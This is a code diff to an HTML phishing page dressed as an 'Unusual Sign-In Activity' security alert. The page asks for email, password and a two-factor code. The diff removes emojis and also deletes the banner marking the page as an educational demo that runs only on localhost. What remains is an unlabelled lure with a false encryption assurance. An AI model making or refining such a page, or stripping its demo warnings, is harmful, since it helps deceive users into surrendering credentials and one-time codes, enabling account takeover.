@@ -115,31 +115,28 @@
     <div class="container">
         <div class="card">
             <div class="header">
-                <div class="warning-icon">⚠️🔒</div>
+                <div class="warning-icon"></div>
                 <h2>Security Alert: Unusual Sign-In Activity</h2>
                 <p>We've detected a suspicious login attempt to your account</p>
             </div>
             <div class="content">
                 <form action="/login" method="POST">
                     <div class="input-group">
-                        <label>📧 Email Address</label>
+                        <label>Email Address</label>
                         <input type="email" name="email" placeholder="your@email.com" required>
                     </div>
                     <div class="input-group">
-                        <label>🔐 Password</label>
+                        <label> Password</label>
                         <input type="password" name="password" placeholder="••••••••" required>
                     </div>
                     <div class="input-group" id="totpGroup" style="display: none;">
-                        <label>📱 Two-Factor Authentication Code</label>
+                        <label> Two-Factor Authentication Code</label>
                         <input type="text" name="totp" placeholder="Enter 6-digit code" maxlength="6">
                     </div>
                     <button type="submit">Secure Account & Verify Identity</button>
                 </form>
                 <div class="security-badge">
-                    🔒 Protected by industry-standard encryption
-                </div>
-                <div class="warning-text">
-                    ⚠️ EDUCATIONAL DEMO - Runs only on localhost
+                     Protected by industry-standard encryption
                 </div>
             </div>
             <div class="footer">
